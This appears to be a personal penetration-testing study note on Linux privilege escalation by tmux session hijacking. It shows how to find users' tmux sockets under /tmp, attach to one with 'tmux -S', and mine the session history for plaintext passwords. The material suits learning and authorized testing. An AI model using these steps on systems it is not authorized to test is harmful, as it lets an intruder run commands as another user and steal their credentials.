---
tags: [technique, privesc, linux]
aliases: [tmux Session Hijacking]
---
# tmux Hijacking

> **tmux** (terminal multiplexer) manages terminal sessions that keep running in the background even after "detaching". Each session belongs to a user and runs with their permissions. If I can access the **socket** of someone else's (e.g. root's) session, I can attach to it and run commands in it as that user.

## Why it's dangerous
- tmux creates a socket file per user: `/tmp/tmux-<uid>/default`.
- If the permissions on the socket are too open (or it's a service account I'm already inside), I can attach.
- The hijacked session often still contains **history/plaintext passwords** from previous commands.
- The session runs with the permissions of the user who owns it.

## Finding
```bash
# who is logged in and what are they doing (WHAT column)
w
# USER  TTY    FROM            ... WHAT
# sadm  pts/3  tmux(1141).%0   ... -bash   <- running in a tmux session

# find the socket
ls -la /tmp/tmux-*/
# /tmp/tmux-1001/default
```

## Attaching
```bash
tmux -S /tmp/tmux-1001/default attach
```
- `-S <socket>` = "use **this** socket" instead of the default one.
